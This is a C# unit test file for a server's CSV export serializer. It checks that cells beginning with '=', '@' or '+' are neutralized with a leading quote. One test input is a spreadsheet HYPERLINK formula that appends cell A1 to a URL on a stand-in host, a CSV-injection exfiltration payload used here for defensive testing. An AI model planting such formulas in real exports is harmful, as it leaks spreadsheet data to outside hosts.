// Copyright (c) Honua Geo Inc. All rights reserved.
// Licensed under the Fair Core License, Version 1.0, ALv2 Future License. See LICENSE in the project root.

using System.Text;
using Honua.Core.Features.FieldWorkflows.Export;
using Honua.Core.Features.FieldWorkflows.Review;
using Honua.Server.Features.FieldWorkflows.Export;
using Honua.TestKit.Attributes;

namespace Honua.Server.Tests.Features.FieldWorkflows;

public sealed class FieldExportSerializerCsvTests
{
    private const string Formula = "=HYPERLINK(\"https://example.invalid/?x=\"&A1,\"open\")";

    [UnitTest]
    public void Csv_CallerControlledFormulaCells_AreNeutralized()
    {
        var row = DataRow(Record(deviceId: Formula, assignedTo: "@reviewer", decisionNote: "+1 approve"));

        Assert.Contains("\"'=HYPERLINK(\"\"https://example.invalid/?x=\"\"&A1,\"\"open\"\")\"", row, StringComparison.Ordinal);
        Assert.Contains(",'@reviewer,", row, StringComparison.Ordinal);
        Assert.Contains(",'+1 approve,", row, StringComparison.Ordinal);
        Assert.DoesNotContain(",=", row, StringComparison.Ordinal);
    }

    [UnitTest]
    public void Csv_PlainValuesAndEmptyCells_AreUnchanged()
    {
        var row = DataRow(Record(deviceId: "device-7", assignedTo: null, decisionNote: null));

        Assert.Contains(",device-7,", row, StringComparison.Ordinal);
        Assert.DoesNotContain("'", row, StringComparison.Ordinal);
        Assert.EndsWith(",,false", row, StringComparison.Ordinal);
    }

    private static string DataRow(FieldSubmissionRecord record)
    {
        var csv = Encoding.UTF8.GetString(FieldExportSerializer.Serialize("csv", [record]));
        var lines = csv.Split(["\r\n", "\n"], StringSplitOptions.RemoveEmptyEntries);
        Assert.Equal(2, lines.Length);
        return lines[1];
    }

    private static FieldSubmissionRecord Record(string deviceId, string? assignedTo, string? decisionNote) => new()
    {
        SubmissionId = Guid.Parse("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb"),
        FormId = "form-1",
        FormVersion = 1,
        ServiceId = "svc",
        LayerId = 1,
        Operation = "create",
        SyncStatus = FieldSyncStatus.Pending,
        DeviceId = deviceId,
        SubmittedAt = DateTimeOffset.UnixEpoch,
        Review = new FieldReviewState
        {
            Status = FieldReviewStatus.Pending,
            AssignedTo = assignedTo,
            DecisionNote = decisionNote,
            UpdatedAt = DateTimeOffset.UnixEpoch,
        },
    };
}
